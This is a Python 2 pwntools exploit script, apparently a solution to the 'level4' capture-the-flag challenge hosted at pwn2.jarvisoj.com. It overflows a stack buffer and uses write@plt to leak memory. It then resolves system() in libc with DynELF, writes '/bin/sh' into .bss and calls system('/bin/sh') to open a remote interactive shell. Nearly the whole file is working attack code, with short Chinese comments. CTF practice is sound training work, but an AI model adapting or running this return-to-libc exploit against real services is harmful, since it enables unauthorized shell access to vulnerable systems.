#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF('./level4')
write_plt_addr = elf.plt['write']
read_plt_addr = elf.plt['read']
bss_base = elf.bss()
main_addr = elf.symbols['main']
junk = 'A' * (0x88 + 0x04)

Io = remote("pwn2.jarvisoj.com", 9880)

def leak(addr):
	payload = junk + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(addr) + p32(4)
	Io.send(payload)
	leaked = Io.recv(4)
	print '[%s] -> [%s] = [%s]' % (hex(addr), hex(u32(leaked)), repr(leaked))
	return leaked

d = DynELF(leak, elf = ELF('./level4'))  # 调用DynELF泄漏地址信息
system_addr = d.lookup('system', 'libc')  # 查找system的地址
print '[system()] -> [%s]' % (hex(system_addr))

payload = junk + p32(read_plt_addr) + p32(main_addr) + p32(0) + p32(bss_base) + p32(8)
Io.send(payload)

Io.send('/bin/sh\x00')  # 将字符串"/bin/sh\0"写入bss

payload = junk + p32(system_addr) + p32(0) + p32(bss_base)  # 调用system("/bin/sh")
Io.send(payload)

Io.interactive()